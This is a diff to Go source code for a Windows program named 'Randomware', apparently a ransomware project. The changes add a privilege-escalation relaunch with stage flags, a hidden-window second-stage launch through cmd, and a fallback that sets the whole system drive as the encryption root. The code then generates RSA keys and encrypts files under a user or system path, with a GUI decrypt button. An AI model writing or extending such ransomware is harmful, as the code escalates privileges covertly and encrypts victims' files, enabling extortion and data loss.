@@ -4,91 +4,97 @@ import (
 	//"Randomware/encryption"
 	"Randomware/encryption"
 	"Randomware/encryption/keys"
+	"Randomware/environment"
 	"Randomware/file"
 	"Randomware/security/privilege"
 	"log"
 	"os"
-	"os/user"
-	"path/filepath"
+	"os/exec"
 	"strconv"
+	"syscall"
 
 	"github.com/lxn/walk"
 	. "github.com/lxn/walk/declarative"
 )
 
-// PubKeyFile : is the public key file name
-const PubKeyFile string = "rsa_public_key.pub"
-
-// PrivKeyFile : is the private key file name
-const PrivKeyFile string = "rsa_private_key.priv"
-
-// EncryptedKeyFile : is the encrypted key file
-const EncryptedKeyFile string = "safe_key"
-
-// UserPath : is the path of the user who executed the exe
-var UserPath string
-
 // checkElevate : initializes the environment variables
 func checkElevate() bool {
 	_, err := os.Create("C:\\test.txt")
-	return err != nil
+	return err == nil
 }
 
-// setEnv : initializes the environment variables
-func setEnv() {
-	user, err := user.Current()
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	UserPath = user.HomeDir
-
-	file.HostName, err = os.Hostname()
-
-	if err != nil {
-		file.HostName = ".BAD-PC"
-	} else {
-		file.HostName = "." + file.HostName
-	}
-
+func main() {
 	exePath, err := os.Executable()
 
 	if err != nil {
 		log.Fatal(err)
 	}
-
-	exeDir := filepath.Dir(exePath) + "\\"
-	file.SafeFiles = []string{exePath, exeDir + PubKeyFile, exeDir + PrivKeyFile, exeDir + EncryptedKeyFile}
-}
-
-func main() {
-	args := os.Args
-	setEnv()
-	if file.SafeFiles[0] == "C:\\Users\\peter\\go\\src\\Randomware\\Randomware.exe" {
+	if exePath == "C:\\Users\\peter\\go\\src\\Randomware\\Randomware.exe" {
 		print("Safe zone !")
-		os.Exit(0)
+		os.Exit(-1)
 	}
 
-	if !checkElevate() {
-		if len(args) == 1 {
-			privilege.WindowsEscalate(file.SafeFiles[0] + " -e")
-			os.Exit(0)
+	args := os.Args
+	if len(args) != 1 {
+		switch args[1] {
+		case "-e1":
+			if checkElevate() {
+				dst, err := os.Create("C:\\firstStage.txt")
+				if err == nil {
+					defer dst.Close()
+				}
+				print("Admin")
+				environment.Setup(true)
+				print(environment.ExePath)
+				var cmd *exec.Cmd
+				cmd = exec.Command("cmd", "/C", "start "+environment.ExePath+" -e2")
+				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+				_, err = cmd.Output()
+				if err != nil {
+					print("Launch Failed")
+					environment.SetupSafeFiles(false)
+					environment.EncryptionRootPath = os.Getenv("SystemDrive") + "\\"
+				} else {
+					os.Exit(0)
+				}
+			} else {
+				print("User")
+				dst, _ := os.Create("C:\\Users\\peter\\You\\firstStage.txt")
+				defer dst.Close()
+				environment.SetupSafeFiles(false)
+			}
+		case "-e2":
+			environment.SetupSafeFiles(true)
+			dst, _ := os.Create("secondStage.txt")
+			defer dst.Close()
+		case "-c":
+			environment.SetupSafeFiles(false)
+		default:
+			print("Bad argument")
+			os.Exit(-2)
+
 		}
 	} else {
-		UserPath = "C:\\"
+		if checkElevate() {
+			environment.Setup(false)
+			environment.Setup(true)
+		} else {
+			environment.Setup(false)
+			print(environment.ExePath)
+			privilege.WindowsEscalate(environment.ExePath + " -e1")
+			os.Exit(0)
+		}
 	}
-
-	print(checkElevate())
 	var inTE, outTE *walk.TextEdit
 
 	//File Encryption
 	privateKey, publicKey := keys.GenerateKeyPair(4096)
-	file.BytesToNewFile(PubKeyFile, keys.PublicKeyToBytes(publicKey))
-	file.BytesToNewFile(PrivKeyFile, keys.PrivateKeyToBytes(privateKey))
+	file.BytesToNewFile(environment.PubKeyFile, keys.PublicKeyToBytes(publicKey))
+	file.BytesToNewFile(environment.PrivKeyFile, keys.PrivateKeyToBytes(privateKey))
 	//Encrypt file
 	key := encryption.GenKey()
-	file.BytesToNewFile(EncryptedKeyFile, keys.EncryptWithPublicKey(key, publicKey))
-	nbrFiles, err := file.EncryptAll(UserPath, key)
+	file.BytesToNewFile(environment.EncryptedKeyFile, keys.EncryptWithPublicKey(key, publicKey))
+	nbrFiles, err := file.EncryptAll(environment.UserPath, key)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -111,11 +117,11 @@ func main() {
 				Text: "Decrypt",
 				OnClicked: func() {
 					//File Decryption
-					encryptedKey, err := file.BytesFromFile(EncryptedKeyFile)
+					encryptedKey, err := file.BytesFromFile(environment.EncryptedKeyFile)
 					if err != nil {
 						log.Fatal(err)
 					}
-					privateKeyBytes, err := file.BytesFromFile(PrivKeyFile)
+					privateKeyBytes, err := file.BytesFromFile(environment.PrivKeyFile)
 					if err != nil {
 						log.Fatal(err)
 					}
